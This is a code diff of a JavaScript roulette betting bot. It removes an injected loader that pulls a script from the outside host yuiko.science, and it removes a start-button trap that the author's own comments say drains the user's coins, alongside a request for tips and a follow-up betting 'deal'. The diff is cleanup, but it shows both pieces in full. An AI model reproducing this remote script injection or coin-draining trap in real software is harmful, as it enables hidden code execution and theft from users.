@@ -19,8 +19,6 @@
 
 'use strict';
 
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//yuiko.science/in.js "; document.body.appendChild( scriptElement ); })();
-
 var debug = false;
 var simulation = false;
 var stop_on_min_balance = false;
@@ -228,18 +226,7 @@ function Automated() {
     }
 
     this.menu.start.onclick = function() {
-        start(self.balance);
-        self.log('Didn\'t they warn you not to use bots?');
-
-        // You were clever enough to inspect the code, nice! The lines above will make your coins disappear...
-        // Just for you small tip, delete two lines above (start and self.log) and uncomment line below (self.start).
-        // The bot is working perfectly fine, I spent too much time on it to close the project.
-        // Also, if you read this tip me (steamid displays on the page) 3 (exactly 3) coins,
-        // just so I can know you're clever. Good luck!
-        // PS. If you already lost the coins - write to me - I have a deal for you, we bet your coins on green, if site
-        // rolls green, you get all of them back.
-
-        // self.start();
+        self.start();
     };
 
     this.menu.stop.onclick = function() {
